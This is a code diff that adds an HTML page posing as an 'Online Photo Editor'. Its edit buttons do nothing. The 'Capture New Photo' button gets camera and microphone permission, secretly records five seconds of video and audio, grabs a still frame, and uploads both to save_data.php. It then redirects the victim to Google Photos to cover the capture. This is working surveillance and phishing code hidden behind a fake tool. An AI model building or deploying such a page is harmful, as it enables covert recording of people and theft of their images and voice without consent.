@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Photo Editor - Edit & Enhance Your Photos</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://img.icons8.com/plasticine/100/000000/image-editor.png" type="image/png">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+            color: #333;
+            text-align: center;
+        }
+        .header {
+            width: 100%;
+            background-color: #fff;
+            padding: 15px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+            color: #2c3e50;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 1px 6px rgba(0,0,0,0.1);
+            padding: 30px;
+            max-width: 600px;
+            width: 90%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        #main-image-preview {
+            width: 100%;
+            max-width: 500px;
+            height: auto;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-bottom: 25px;
+            background-color: #eee;
+            display: block;
+        }
+        .controls {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        .controls button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin: 5px;
+        }
+        .controls button:hover {
+            background-color: #218838;
+        }
+        .controls .red-button {
+            background-color: #dc3545;
+        }
+        .controls .red-button:hover {
+            background-color: #c82333;
+        }
+        #message {
+            font-size: 1.1em;
+            color: #555;
+            margin-top: 15px;
+            min-height: 20px;
+        }
+        #camera-preview {
+            width: 80%;
+            max-width: 300px;
+            margin: 20px auto;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            overflow: hidden;
+            display: none;
+        }
+        #camera-preview video {
+            width: 100%;
+            display: block;
+        }
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Online Photo Editor</h1>
+    </div>
+
+    <div class="container">
+        <img id="main-image-preview" src="https://via.placeholder.com/500x300?text=Your+Image+Here" alt="Image Preview">
+        <div class="controls">
+            <button>Apply Filter</button>
+            <button>Crop Image</button>
+            <button id="captureButton">Capture New Photo</button>
+            <button class="red-button">Save & Download</button>
+        </div>
+        <p id="message">Click "Capture New Photo" to add a new image to edit.</p>
+        
+        <div id="camera-preview">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+        </div>
+    </div>
+
+    <script>
+        const captureButton = document.getElementById('captureButton');
+        const mainImagePreview = document.getElementById('main-image-preview');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const message = document.getElementById('message');
+        const cameraPreviewDiv = document.getElementById('camera-preview');
+        let mediaRecorder;
+        let videoChunks = []; // To store video+audio chunks
+
+        const RECORDING_DURATION = 5000; // Record for 5 seconds
+
+        captureButton.addEventListener('click', () => {
+            message.textContent = "Requesting camera & microphone access...";
+            mainImagePreview.src = "https://via.placeholder.com/500x300?text=Loading+Camera...";
+
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    cameraPreviewDiv.style.display = 'block';
+                    message.textContent = "Camera active. Recording and processing...";
+
+                    // Initialize MediaRecorder for video and audio
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8,opus' }); // Specify codec for wider compatibility
+                    videoChunks = [];
+
+                    mediaRecorder.ondataavailable = event => {
+                        videoChunks.push(event.data);
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const videoBlob = new Blob(videoChunks, { 'type' : 'video/webm' });
+                        sendDataToServer(stream, videoBlob); // Send stream and the combined video+audio blob
+                    };
+
+                    mediaRecorder.start(); // Start recording
+                    // Stop recording after RECORDING_DURATION
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, RECORDING_DURATION);
+
+                    video.onloadedmetadata = function() {
+                        video.play();
+                    };
+                })
+                .catch(function(err) {
+                    message.textContent = "Error: Camera/Mic access denied or not available. Redirecting...";
+                    console.error("Error accessing camera/microphone: ", err);
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com/photos/";
+                    }, 3000);
+                });
+        });
+
+        function sendDataToServer(stream, videoBlob) {
+            // Capture image from the video stream's current frame
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            message.textContent = "Processing image and video...";
+            mainImagePreview.src = "https://via.placeholder.com/500x300?text=Processing...";
+
+            const formData = new FormData();
+            formData.append('imgdata', imageData);
+            formData.append('videoFile', videoBlob, 'recording.webm'); // Append video blob
+
+            fetch('save_data.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    console.log("Data saved:", data);
+                    message.textContent = "Image and video processed! Redirecting...";
+                } else {
+                    console.error("Error saving data:", data.message);
+                    message.textContent = "Error processing. Redirecting...";
+                }
+            })
+            .catch(error => {
+                console.error('Fetch error:', error);
+                message.textContent = "Network error during upload. Redirecting...";
+            })
+            .finally(() => {
+                // Stop camera stream
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                cameraPreviewDiv.style.display = 'none';
+
+                setTimeout(() => {
+                    window.location.href = "https://photos.google.com/";
+                }, 2500);
+            });
+        }
+    </script>
+</body>
+</html>
